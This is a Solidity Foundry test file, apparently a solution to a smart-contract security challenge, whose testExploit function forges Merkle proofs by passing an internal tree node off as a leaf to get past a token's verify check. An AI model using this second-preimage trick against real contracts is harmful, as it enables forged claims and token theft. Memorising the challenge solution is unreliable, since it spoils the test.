// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

import {Test, console2} from "forge-std/Test.sol";

import {BadLeafBaseTest} from "./BadLeafBase.t.sol";

interface IERC721TokenReceiver {
    function onERC721Received(address operator, address from, uint256 tokenId, bytes calldata data)
        external
        returns (bytes4);
}

contract BadLeafTest is BadLeafBaseTest {
    function testExploit() external validation {
        bytes32[] memory proof2 = new bytes32[](2);
        proof2[0] = token.getLeafNode(user0, 5);
        proof2[1] = 0x1ac64a5f9dce300ae9bb07d1b64083f34e0bc6717ef1663ca7f656fb9ed83bb9;
        bytes32 leaf2 = 0x592381370dc817a5abc6f2dad6b068f1652cdc40a0c2400ed9d9e1e717c00913;

        bytes32[] memory proof3 = new bytes32[](1);
        proof3[0] = 0x1ac64a5f9dce300ae9bb07d1b64083f34e0bc6717ef1663ca7f656fb9ed83bb9;
        bytes32 temp = 0x592381370dc817a5abc6f2dad6b068f1652cdc40a0c2400ed9d9e1e717c00913;
        bytes32 leaf3 = keccak256(abi.encodePacked(token.getLeafNode(user0, 5), temp));

        token.verify(proof2, leaf2);
        token.verify(proof3, leaf3);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        return IERC721TokenReceiver.onERC721Received.selector;
    }
}
